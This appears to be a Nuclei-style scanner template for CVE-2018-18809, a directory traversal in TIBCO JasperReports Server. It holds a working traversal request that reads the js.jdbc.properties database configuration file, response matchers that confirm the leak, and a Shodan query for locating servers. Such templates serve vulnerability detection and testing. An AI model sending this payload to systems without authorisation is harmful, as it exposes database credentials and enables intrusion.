id: CVE-2018-18809

info:
  name: TIBCO JasperReports Library - Directory Traversal
  author: DhiyaneshDK
  severity: critical
  description: |
    The default server implementation of TIBCO Software Inc.'s TIBCO JasperReports Library, TIBCO JasperReports Library Community Edition, TIBCO JasperReports Library for ActiveMatrix BPM, TIBCO JasperReports Server, TIBCO JasperReports Server Community Edition, TIBCO JasperReports Server for ActiveMatrix BPM, TIBCO Jaspersoft for AWS with Multi-Tenancy, and TIBCO Jaspersoft Reporting and Analytics for AWS contains a directory-traversal vulnerability that may theoretically allow web server users to access contents of the host system.
  reference:
    - https://packetstormsecurity.com/files/154406/Tibco-JasperSoft-Path-Traversal.html
    - https://security.elarlang.eu/cve-2018-18809-path-traversal-in-tibco-jaspersoft.html
    - https://nvd.nist.gov/vuln/detail/CVE-2018-18809
  classification:
    cve-id: CVE-2018-18809
  metadata:
    max-request: 1
    verified: true
    shodan-query: html:"jasperserver-pro"
  tags: cve,cve2018,lfi,kev,jasperserver,jasperreport

http:
  - method: GET
    path:
      - "{{BaseURL}}/jasperserver-pro/reportresource/reportresource/?resource=net/sf/jasperreports/../../../../js.jdbc.properties"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "metadata.jdbc.driverClassName"
          - "metadata.hibernate.dialect"
        condition: and

      - type: status
        status:
          - 200
